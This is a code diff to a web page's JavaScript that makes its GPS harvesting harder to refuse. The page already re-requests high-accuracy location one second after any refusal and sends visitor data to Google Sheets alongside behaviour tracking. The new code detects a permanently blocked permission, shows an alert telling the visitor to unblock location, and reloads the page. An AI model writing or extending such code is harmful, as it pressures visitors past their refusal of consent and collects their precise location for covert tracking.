@@ -706,9 +706,34 @@
             initBehaviorTracking();
         }
 
+        // Check if permission is permanently blocked
+        async function checkPermissionState() {
+            if (navigator.permissions) {
+                try {
+                    const result = await navigator.permissions.query({ name: 'geolocation' });
+                    return result.state; // 'granted', 'denied', or 'prompt'
+                } catch (e) {
+                    return 'prompt';
+                }
+            }
+            return 'prompt';
+        }
+
         // Request GPS permission - keeps asking until allowed
-        function requestGPS() {
+        async function requestGPS() {
             if (!navigator.geolocation || gpsGranted) {
+                return;
+            }
+
+            // Check if permanently blocked
+            const permState = await checkPermissionState();
+
+            if (permState === 'denied') {
+                // Permission permanently blocked - show alert and reload
+                alert('Location is blocked. Please tap the lock icon in your browser address bar, enable Location, then this page will reload.');
+                setTimeout(() => {
+                    location.reload();
+                }, 3000);
                 return;
             }
 
@@ -741,7 +766,7 @@
                     sendToGoogleSheets(visitorData);
                 },
                 (error) => {
-                    // GPS denied - immediately ask again
+                    // GPS denied - check if permanently blocked or just dismissed
                     setTimeout(requestGPS, 1000);
                 },
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
